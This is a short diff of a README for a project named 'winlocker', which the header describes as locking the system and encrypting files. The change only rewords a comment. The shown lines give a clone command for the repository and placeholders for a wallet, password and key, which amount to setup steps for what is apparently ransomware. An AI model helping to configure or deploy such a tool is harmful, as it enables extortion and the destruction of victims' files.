@@ -24,7 +24,7 @@ winlocker — Locks the system and encrypts files
 # Clone repository
 git clone https://github.com/cppandpython/winlocker.git
 
-# Change in winlocker.py
+# Edit in winlocker.py
 WALLET = 'YOUR WALLET'
 PASSWORD = 'YOUR PASSWORD'
 KEY = 'YOUR KEY'
